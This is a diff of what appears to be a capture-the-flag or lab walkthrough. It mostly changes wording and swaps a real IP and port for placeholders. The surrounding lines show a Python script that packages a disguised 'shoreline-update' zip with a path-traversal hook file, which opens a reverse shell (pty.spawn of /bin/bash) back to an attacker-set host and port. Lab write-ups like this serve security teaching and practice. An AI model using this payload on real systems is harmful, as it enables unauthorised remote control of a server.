@@ -13,7 +13,7 @@ https://MACHINE_IP
 ```
 
 ## STEP 01
-- Open the webapp
+- Open the web app
 ```URL
 https://MACHINE_IP
 ```
@@ -43,8 +43,8 @@ This site can't be reached
 import json
 import zipfile
 
-RHOST="192.168.181.19"
-RPORT= 2000
+RHOST="YOUR_iIP"
+RPORT= PORT
 
 manifest = {
     "name": "shoreline-update",
@@ -65,7 +65,7 @@ for descriptor in (0, 1, 2):
 pty.spawn("/bin/bash")
 '''
 
-with zipfile.ZipFile("reverse-shell.zip", "w") as archive:
+with zipfile.ZipFile("shell.zip", "w") as archive:
     archive.writestr("shell.json", json.dumps(manifest))
     archive.writestr(".../hooks/callback.py", callback)
 
